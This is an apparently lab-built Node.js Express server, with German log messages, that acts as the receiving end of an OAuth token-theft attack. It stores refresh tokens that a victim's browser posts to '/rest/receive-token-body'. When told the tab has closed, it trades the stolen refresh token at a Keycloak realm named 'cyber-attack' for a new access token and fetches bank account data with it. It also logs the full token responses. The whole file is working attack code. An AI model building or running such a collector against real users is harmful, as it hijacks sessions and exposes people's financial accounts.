const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 9999;

const tokenRequestsPerSession = {};

app.use(bodyParser.json());
app.use(bodyParser.text());
app.use(express.static('public'));

function logWithSessionId(sessionId, ...messages) {
    const timestamp = new Date().toLocaleTimeString();
    console.log(`${timestamp} [${sessionId}] -`, ...messages);
}

async function fetchNewToken(sessionId, refreshToken) {
    try {
        const response = await fetch("http://localhost:8080/realms/cyber-attack/protocol/openid-connect/token", {
            method: "POST",
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `client_id=prepared-frontend&grant_type=refresh_token&refresh_token=${refreshToken}`,
        });

        if (response.ok) {
            const data = await response.json();
            logWithSessionId(sessionId, `Neue Token wurden mit Refresh Token geholt: ${JSON.stringify(data)}`);
            return data.access_token;
        } else {
            logWithSessionId(sessionId, `Fehler beim Holen neuer Token: ${response.status} ${response.statusText}`);
            return null;
        }
    } catch (error) {
        logWithSessionId(sessionId, `Fehler beim Anfordern neuer Token: ${error.message}`);
        return null;
    }
}

async function fetchBankAccounts(sessionId, accessToken) {
    if (accessToken) {
        fetch('http://localhost:3000/api/accounts', {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${accessToken}`
            }
        })
            .then(response => response.json())
            .then(data => logWithSessionId(sessionId, 'Daten von der API:' + data))
            .catch(err => logWithSessionId(sessionId, 'Fehler beim API-Aufruf:' + err));
    } else {
        console.error('Kein Token erhalten');
    }
}

app.post('/rest/receive-token-body', (req, res) => {
    const {sessionId, body} = req.body;
    tokenRequestsPerSession[sessionId] = body;

    logWithSessionId(sessionId, 'Empfangener Token-Body');
    res.status(200).send();
});

app.post('/rest/tab-closed', (req, res) => {
    const sessionId = req.body;
    logWithSessionId(sessionId, 'Tab oder Browser wurde geschlossen.');

    const refreshToken = tokenRequestsPerSession[sessionId].refresh_token;
    logWithSessionId(sessionId, `Refresh Token: ${refreshToken}`);
    fetchNewToken(sessionId, refreshToken).then(token => {
        fetchBankAccounts(sessionId, token);
    });
});

app.listen(port, () => {
    console.log(`Server läuft unter http://localhost:${port}`);
});
